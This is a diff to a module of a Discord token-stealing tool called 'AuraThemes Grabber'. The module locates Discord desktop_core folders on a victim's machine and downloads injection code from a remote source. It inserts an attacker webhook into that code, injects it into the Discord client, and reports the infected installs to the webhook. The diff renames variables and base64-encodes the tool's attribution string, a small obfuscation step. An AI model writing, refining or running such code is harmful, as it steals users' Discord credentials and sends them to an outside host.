@@ -6,12 +6,13 @@ const path = require("path");
 const glob = require("glob");
 const process = require("process");
 const { exec, execSync, spawn } = require("child_process");
+const { decode_B64 } = require("./../../utils/functions/functions.js");
 const { filter_processes } = require("./../core/core.js");
 const { instance } = require("./../../utils/axios/request.js");
 
 const local = process.env.localappdata;
 
-const injec_path = [];
+const inject_path = [];
 
 let infected_discord = [];
 
@@ -82,12 +83,12 @@ const discord_injected = async (res, webhook) => {
         const app = apps[x];
         const desktop_cores = glob.sync(`${app}/modules/discord_desktop_core-*`);
 
-        injec_path.push(...desktop_cores);
+        inject_path.push(...desktop_cores);
       }
     }
 
-    for (let i = 0; i < injec_path.length; i++) {
-      const desktop_path = injec_path[i];
+    for (let i = 0; i < inject_path.length; i++) {
+      const desktop_path = inject_path[i];
       const injection = (await instance.get(Injection)).data;
 
       replaced_inject = injection.replace("%WEB" + "HOOK%", webhook[0]);
@@ -117,13 +118,13 @@ const discord_injected = async (res, webhook) => {
           }
         }, 12000);
 
-        injec_path.forEach((path) => {
+        inject_path.forEach((path) => {
           let match = path.match(/Local\/(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\//i);
           let name = match ? match[1] : "Not Found";
           infected_discord.push(`\`${name}\``);
         });
 
-        infected_discord = infected_discord.length > 0 ? infected_discord.join(", ") : "Not Found";
+        infected_discord = infected_discord.length > 0 ? infected_discord.join(", ") : "❌";
 
         await instance({
           "url": webhook[0],
@@ -137,8 +138,8 @@ const discord_injected = async (res, webhook) => {
               "description": infected_discord,
               "timestamp": new Date(),
               "footer": {
-                "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
+                "text": decode_B64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
+                "icon_url": 'https://i.imgur.com/yVnOSeS.gif'
               }
             }]
           }
@@ -154,5 +155,6 @@ const discord_injected = async (res, webhook) => {
 };
 
 module.exports = {
+  inject_path,
   discord_injected
 }
